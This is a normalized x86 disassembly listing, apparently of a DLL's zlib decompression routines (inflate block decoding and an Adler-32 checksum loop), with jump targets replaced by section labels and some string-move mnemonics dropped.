mov ebp [ esi + 0x8 ]
add ebp edx
mov [ esi + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp eax 0x9
ja r-xdata
jmp [ eax * 4 + jump_table_1000afb8 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ecx edi
mov edx [ eax ]
mov ebp [ eax + 0x8 ]
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
mov ecx [ esp + 0x4c ]
push ecx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec eax
mov cl [ edi ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] eax
or esi edx
inc edi
cmp ebp 0x3
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] edi
jb r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx ] 0x9
mov edx eax
push 0xfffffffd
mov [ ecx + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
sub edx esi
add ebp edx
mov [ ecx ] eax
mov eax [ esp + 0x48 ]
push ecx
mov [ ecx + 0x4 ] edi
mov [ ecx + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] eax
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ebp ebp
mov eax ecx
cmp eax ebp
mov [ ebx + 0x4 ] ecx
mov [ esp + 0x18 ] ebp
je r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx eax
sub edx esi
mov [ ecx ] eax
mov eax [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ ecx + 0x8 ] ebp
push edx
push ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
mov [ esp + 0x4c ] edx
mov cl [ eax ]
dec edi
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] edi
or esi edx
inc eax
cmp ebp 0x20
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ esp + 0x4c ] 0x0
cmp eax edi
jbe r-xdata
mov ecx [ ebx + 0x2c ]
mov edx [ esp + 0x44 ]
cmp edx ecx
jne r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
push 0xfffffffd
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x14 ]
push eax
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
sub edx esi
add ebp edx
push ebx
mov [ eax + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx eax
and edx 0x3e0
cmp edx 0x3a0
ja r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
sub edx esi
add ebp edx
mov edx [ esp + 0x4c ]
push edx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec esi
mov cl [ eax ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] esi
or edi edx
inc eax
cmp ebp 0xe
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ ebx + 0x24 ]
push esi
lea ecx [ ebx + 0x14 ]
lea eax [ ebx + 0x10 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
push eax
push edx
mov [ eax ] 0x7
call sub_1000b980
add esp 0x14
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
mov [ ecx + edx * 4 ] 0x0
mov edx [ ebx + 0x8 ]
inc edx
mov ecx edx
mov [ ebx + 0x8 ] edx
cmp ecx eax
jb r-xdata
mov ecx [ ebx + 0x8 ]
mov eax edi
and eax 0x7
sub ebp 0x3
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
shr edi 0x3
mov [ ecx + edx * 4 ] eax
mov edx [ ebx + 0x8 ]
inc edx
mov [ ebx + 0x8 ] edx
mov eax edx
mov edx [ ebx + 0x4 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jb r-xdata
mov eax [ esp + 0x10 ]
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x1c ]
push esi
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_1000b170
add esp 0x14
test eax eax
je r-xdata
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebx + 0x14 ]
and eax edi
xor edx edx
mov dl [ ecx + eax * 8 + 0x1 ]
lea eax [ ecx + eax * 8 ]
mov [ esp + 0x18 ] edx
mov eax [ eax + 0x4 ]
cmp eax 0x10
mov [ esp + 0x34 ] eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] ebp
mov ebp [ esi ]
mov eax edi
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub eax ebp
push 0x1
add edx eax
push esi
mov [ esi + 0x8 ] edx
mov [ esi ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
sub ebp 0x3
mov [ ebx ] 0x1
mov ecx ebp
and ecx 0x7
shr esi 0x3
shr esi cl
sub ebp ecx
mov [ esp + 0x18 ] esi
jmp r-xdata
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x34 ]
push ecx
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_1000c080
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x4c ]
push eax
push ecx
push edx
call sub_1000b170
add esp 0x28
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x3
jmp r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
add ebp 0xfffffffd
shr esi 0x3
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
mov edx edi
push 0xfffffffd
sub edx ecx
mov ecx [ esp + 0x48 ]
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x18 ]
neg eax
sbb eax eax
and eax 0x7
mov [ ebx ] eax
jmp r-xdata
mov eax 0x2
mov [ ebx ] eax
jmp r-xdata
cmp eax ecx
jbe r-xdata
mov eax edi
mov eax [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push eax
push edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_1000c0b0
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0x30 ]
add esp 0xc
cmp edx esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ ebx + 0x28 ]
cmp eax esi
je r-xdata
mov esi [ esp + 0x48 ]
push 0x4
shr eax 0x5
and eax 0x1f
lea eax [ eax + ecx + 0x102 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x20 ]
add esp 0xc
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x5
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx [ esi + 0x8 ]
mov edx eax
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
mov [ esi + 0x4 ] 0x0
push ebx
mov [ ebx + 0x34 ] eax
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx ecx
xor ecx ecx
mov cl [ eax ]
dec edx
mov [ esp + 0x14 ] edx
mov edx ecx
mov ecx ebp
add ebp 0x8
shl edx cl
mov [ esp + 0x4c ] 0x0
or edi edx
inc eax
cmp ebp 0x3
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov ecx eax
mov [ esi ] eax
mov eax [ esp + 0x18 ]
sub ecx edi
add edx ecx
push eax
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x48 ]
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
push 0xfffffffc
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x6
jmp r-xdata
cmp eax 0x12
mov ecx 0x7
je r-xdata
mov ecx edx
sub ebp edx
mov edx [ ebx + 0xc ]
shr edi cl
mov ecx [ ebx + 0x8 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebx + 0x8 ]
inc eax
jmp r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
cmp ebp eax
mov [ esp + 0x10 ] ecx
jb r-xdata
mov [ ebx ] 0x7
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ eax ]
mov ecx edi
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
push 0xfffffffc
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x6
jmp r-xdata
mov eax esi
and eax 0x7
mov ecx eax
shr eax 0x1
and ecx 0x1
cmp eax 0x3
mov [ ebx + 0x18 ] ecx
ja r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x44 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x1c ]
and ecx 0x3
sub edx eax
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x44 ]
add ecx eax
mov [ esp + 0x10 ] ecx
mov ecx [ ebx + 0x4 ]
sub edi eax
add esi eax
sub ecx eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x1c ] edx
mov [ ebx + 0x4 ] ecx
jne r-xdata
mov eax ecx
mov ecx [ ebx + 0x2c ]
sub ecx edx
mov ecx esi
sub ecx edx
dec ecx
jmp r-xdata
mov edx esi
cmp edx eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
push 0xfffffffc
mov ecx eax
push esi
sub ecx edi
mov [ esi ] eax
add edx ecx
push ebx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x50 ]
mov [ ebx + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr edi 0xe
sub ebp 0xe
mov [ ebx + 0x8 ] 0x0
mov [ ebx ] 0x4
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
push ecx
push esi
push ebx
mov [ ebx + 0x34 ] eax
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
and eax 0x1f
shr edx 0x5
and edx 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx eax
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub ecx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add edx ecx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x44 ]
push eax
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_1000b1b0
add esp 0xc
cmp eax 0x1
jne r-xdata
sub eax 0x12
mov [ esp + 0x1c ] ecx
neg eax
sbb eax eax
add ecx edx
and al 0xf8
mov [ esp + 0x20 ] ecx
add eax 0xb
cmp ebp ecx
jae r-xdata
lea ecx [ eax - 0xe ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
shr edx 0x5
and edx 0x1f
and eax 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jb r-xdata
mov [ ebx + 0x34 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
push ebx
call sub_1000c0b0
mov ecx [ ebx + 0x34 ]
mov edx [ ebx + 0x30 ]
add esp 0xc
cmp edx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ esp + 0x1c ] ecx
cmp edx eax
mov [ esp + 0x20 ] eax
jne r-xdata
sub ecx edx
sub eax edx
dec eax
mov ecx eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jae r-xdata
mov ecx edx
shr edi cl
mov ecx [ esp + 0x1c ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edi
add eax ecx
mov ecx [ esp + 0x1c ]
shr edi cl
add ecx edx
mov [ esp + 0x18 ] eax
sub ebp ecx
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebx + 0x4 ]
mov edx ecx
and ecx 0x1f
shr edx 0x5
and edx 0x1f
lea ecx [ edx + ecx + 0x102 ]
mov edx [ esp + 0x1c ]
add eax edx
cmp eax ecx
ja r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov eax [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov ebp [ edi ]
mov esi [ edi + 0x8 ]
mov [ edi + 0x4 ] ecx
mov ecx eax
mov [ edi ] eax
sub ecx ebp
add esi ecx
mov [ edi + 0x8 ] esi
mov [ ebx + 0x34 ] edx
mov edx [ esp + 0x4c ]
push edx
push edi
push ebx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x14 ]
mov edx eax
cmp edx esi
mov [ esp + 0x44 ] edx
jae r-xdata
test ecx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add ecx edx
push 0xfffffffd
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_1000c0b0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
cmp [ esp + 0x34 ] 0x10
jne r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
cmp ebp ecx
jb r-xdata
mov ecx [ esp + 0x20 ]
sub ecx edx
sub esi edx
dec esi
mov ecx esi
jmp r-xdata
mov eax [ esp + 0x1c ]
xor ecx ecx
mov eax edx
cmp eax 0x1
jb r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
mov edx [ ebx + 0xc ]
inc eax
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx [ esp + 0x18 ]
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov ecx [ ebx + 0xc ]
mov ecx [ ecx + eax * 4 - 0x4 ]
jmp r-xdata
sub_1000afd0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push 0x0
push esi
push edi
call sub_1000a1a0
mov eax [ edi + 0x28 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
mov edx [ edi + 0x24 ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
push edi
push ecx
call [ esi + 0x24 ]
add esp 0x24
xor eax eax
pop edi
pop esi
retn
sub_1000b010
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov ecx edi
and ecx 0xffff
shr edi 0x10
test esi esi
jne r-xdata
push ebx
mov ebx [ esp + 0x18 ]
test ebx ebx
jbe r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax edi
pop ebx
shl eax 0x10
pop edi
or eax ecx
pop esi
retn
push ebp
sub ebx eax
cmp eax 0x10
jl r-xdata
mov eax 0x15b0
test eax eax
je r-xdata
mov ebp eax
shr ebp 0x4
mov edx ebp
neg edx
shl edx 0x4
add eax edx
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov eax edi
mov edi 0xfff1
mov ecx edx
xor edx edx
div edi
test ebx ebx
mov edi edx
ja r-xdata
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
xor edx edx
mov dl [ esi ]
add esi 0x10
add ecx edx
xor edx edx
mov dl [ esi - 0xf ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xe ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xd ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xc ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xb ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xa ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x9 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x8 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x7 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x6 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x5 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x4 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x3 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x2 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x1 ]
add edi ecx
add ecx edx
add edi ecx
dec ebp
jne r-xdata
cmp ebx 0x15b0
mov eax ebx
jb r-xdata
pop ebp
sub_1000b170
mov eax [ esp + 0x14 ]
push 0x1c
push 0x1
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x20 ]
add esp 0xc
test eax eax
je r-xdata
retn
mov dl [ esp + 0x4 ]
mov cl [ esp + 0x8 ]
mov [ eax + 0x10 ] dl
mov edx [ esp + 0xc ]
mov [ eax + 0x11 ] cl
mov ecx [ esp + 0x10 ]
mov [ eax ] 0x0
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
sub_1000b1b0
sub esp 0x10
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
mov edi [ esp + 0x28 ]
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x24 ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x10 ] eax
cmp edx ecx
jae r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffe
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
jmp [ ecx * 4 + jump_table_1000b930 ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov ecx edx
sub ecx [ eax + 0xc ]
mov eax [ esi + 0x28 ]
cmp ecx eax
mov [ esp + 0x18 ] ecx
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
cmp ebx 0x7
jbe r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0x1
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
push 0xfffffffd
add ecx eax
push edi
mov [ edi + 0x8 ] ecx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x10 ]
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x14 ]
mov [ eax + 0x8 ] ecx
cmp [ esp + 0x28 ] 0xa
jb r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x18 ]
xor ecx ecx
mov cl [ eax ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0x4 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x11 ]
mov [ eax ] 0x3
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x18 ]
mov [ eax + 0x8 ] ecx
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
sub ebx ecx
xor ecx ecx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x18 ]
mov cl [ eax ]
test cl 0x10
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
mov [ eax ] 0x5
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x2c ]
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov cl [ eax + 0x8 ]
mov [ esp + 0x2c ] 0x0
mov [ edx ] cl
mov ecx [ esp + 0x14 ]
inc edx
dec ecx
mov [ esp + 0x14 ] ecx
mov [ eax ] 0x0
jmp r-xdata
